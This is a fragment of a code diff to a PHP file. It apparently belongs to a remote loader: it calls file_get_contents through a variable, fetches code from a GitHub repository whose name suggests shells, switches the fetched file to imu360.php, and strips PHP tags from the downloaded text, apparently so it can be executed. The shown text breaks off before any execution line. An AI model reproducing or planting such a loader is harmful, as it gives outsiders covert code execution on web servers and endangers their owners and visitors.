@@ -3,7 +3,7 @@ ini_set('display_errors', 1);
 ini_set('display_startup_errors', 1);
 error_reporting(E_ALL);
 $c = "file_get_contents";
-$u = "https://raw.githubusercontent.com/santanamichigan/shellkoplak/refs/heads/main/team17.txt";
+$u = "https://raw.githubusercontent.com/santanamichigan/shellkoplak/refs/heads/main/imu360.php";
 $code = $c($u);
 $code = preg_replace('/<\?php|\?>/', '', $code);
 
